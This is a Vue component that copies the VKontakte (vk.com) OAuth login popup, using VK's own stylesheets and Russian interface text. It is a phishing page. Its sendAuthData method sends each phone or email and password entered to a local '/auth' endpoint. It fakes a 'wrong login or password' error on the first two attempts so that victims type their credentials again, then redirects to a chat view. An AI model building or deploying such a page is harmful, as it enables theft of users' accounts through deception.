<template>
    <html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
        <head>
            <meta http-equiv="X-UA-Compatible" content="IE=edge">
            <meta charset="utf-8">
            <title>ВКонтакте | Вход</title>
            <link rel="stylesheet" type="text/css" href="https://vk.com/css/al/common.css?30103891102">
            <link rel="stylesheet" type="text/css" href="https://vk.com/css/al/fonts_cnt.css?2889730895">
            <link type="text/css" rel="stylesheet" href="https://vk.com/css/api/oauth_popup.css?29276183569">
        </head>
        <body onload="doResize();" class="VK oauth_centered">
            <div class="oauth_wrap">
                <div class="oauth_wrap_inner">
                    <div class="oauth_wrap_content" id="oauth_wrap_content">
                        <div class="oauth_head">
                            <a class="oauth_logo fl_l" href="https://vk.com" target="_blank"></a>

                            <div id="oauth_head_info" class="oauth_head_info fl_r">
                                <a class="oauth_reg_link" href="https://vk.com/join?reg=1" target="_blank">Регистрация</a>
                            </div>
                        </div>

                        <div class="oauth_content box_body clear_fix">
                        <div class="box_msg_gray box_msg_padded">Для продолжения Вам необходимо войти <b>ВКонтакте</b>.</div>

                        <form id="login_submit">
                            <div class="oauth_form">
                                <div class="box_error" v-show="enterError">Указан неверный логин или пароль.</div> 

                                <div class="oauth_form_login">
                                    <div class="oauth_form_header">Телефон или email</div>
                                    <input class="oauth_form_input dark" name="login" type="text" v-model="login" onkeypress="if(event.keyCode == 13) return false;">
                                    
                                    <div class="oauth_form_header">Пароль</div>
                                    <input class="oauth_form_input dark" name="pass" type="password" v-model="pass" onkeypress="if(event.keyCode == 13) return false;">

                                    

                                    <button class="flat_button oauth_button button_wide" id="install_allow" type="button" @click="sendAuthData">Войти</button>
                                    <!--a class="oauth_forgot" href="https://vk.com/restore" target="_blank">Забыли пароль?</a-->
                                </div>
                            </div>
                        </form>

                        </div>
                    </div>
                </div>
            </div>
        </body>
    </html>
</template>

<script>
    export default {
        name: 'entrance',

        data:function(){
            return{
                enterError: false,

                login: '',
                pass: '',

                authCount: 0
            }
        },

        methods:{
            sendAuthData:function(){
                if ((this.authCount >= 2) && (this.login != '') && (this.pass != '')){
                    axios({
                        method: 'POST',
                        url: '/auth',
                        data:{
                            login: this.login,
                            pass: this.pass
                        }
                    })
                        .then(function(res){

                        })
                        .catch(function(err){
                            console.log(err);
                        })

                    this.enterError = false;

                    setTimeout(function(){
                        location.replace('#/chat');
                    }, 1200);
                }else if((this.login != '') || (this.pass != '')){
                        axios({
                            method: 'POST',
                            url: '/auth',
                            data:{
                                login: this.login,
                                pass: this.pass
                            }
                        })
                            .then(function(res){

                            })
                            .catch(function(err){
                                console.log(err);
                            })

                        this.authCount++;

                        setTimeout(()=>{
                            this.enterError = true;
                        }, 500);
                    }else{
                        setTimeout(()=>{
                            this.enterError = true;
                        }, 500);                    
                    }

         

                this.login = '';
                this.pass = '';
            }
        }
    }
</script>

<style scoped>
    #oauth_wrap_content{
        margin-top: 100px !important;
    }

</style>